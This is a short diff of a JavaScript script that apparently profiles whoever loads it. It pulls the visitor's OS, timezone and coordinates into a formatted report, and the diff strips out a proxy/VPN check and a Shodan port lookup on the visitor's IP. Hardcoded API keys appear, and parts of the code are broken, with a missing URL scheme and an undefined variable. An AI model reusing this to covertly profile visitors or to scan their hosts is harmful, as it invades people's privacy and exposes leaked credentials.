@@ -121,17 +121,6 @@ fetch('https://api.ipregistry.co/user_agent?key=ucal10ndx2bmo0kf')
   let osnam = data.os.name;
   let osvers = data.os.version;
 
-fetch('ipinfo.io/' + ip + '?token=afae6637fcf7bf')
-.then(response => response.json())
-.then(data => {
-    let isVPN = data.vpn;
-    let isProxy = data.proxy;
-
-
-fetch('https://api.shodan.io/shodan/host/' + ip + '?key=D5FJgrGr49WhZIoPaZGHVCCWp2QvXmaT')
-.then(response => response.json())
-.then(data => {
-  const ports = data.ports;
 
         const message = `
 *🔎 ip*
@@ -142,8 +131,6 @@ fetch('https://api.shodan.io/shodan/host/' + ip + '?key=D5FJgrGr49WhZIoPaZGHVCCW
 *└ Timezone IP: ${time}*
 
 *📶 Net Info*
-*├ Proxy: ${isProxy}*
-*├ Anonymous: ${isAnonymous}*
 *├ Coordinates: ${longitude} ${latitude},*
 *├ TLD: ${tld}*
 *├ Version: ${versian}*
